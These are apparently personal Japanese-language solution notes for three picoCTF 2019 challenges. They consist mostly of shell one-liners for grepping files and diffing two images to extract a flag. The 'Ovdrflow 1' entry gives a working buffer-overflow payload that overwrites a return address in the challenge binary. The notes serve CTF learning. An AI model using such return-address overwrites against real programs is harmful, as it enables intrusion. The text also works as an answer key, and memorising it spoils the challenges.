# picoCTF2019

### Ovdrflow 1
    戻りアドレスをprintfしてくれるので、それを書き換えればよい。<br>
    `python -c 'print "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" "\xe6\x85\x04\x08"' | ./vuln`

### First Grep: PartII
- 文字列検索の便利コマンド<br>
    - 中身まで表示 `find . -type f -print | xargs grep 'pico'`
    - ファイル名だけ表示 `grep "pico" -rl .`

### whats-the-difference
- ワンライナー系
    - 2つのファイルの差分を表示。後ろ側のファイルを文字として抽出
        `cmp -l kitters.jpg cattos.jpg | gawk '{printf "%08X %02x %c\n", $1, strtonum(0$2), strtonum(0$3)}' | rev | cut -c -1 > flag.txt`
    - ファイルから改行を削除
        `cat flag.txt | tr -d '\n'`
    - ちなみに、全部つなげてもいい。
        `cmp -l kitters.jpg cattos.jpg | gawk '{printf "%08X %02x %c\n", $1, strtonum(0$2), strtonum(0$3)}' | rev | cut -c -1 | tr -d '\n'`
    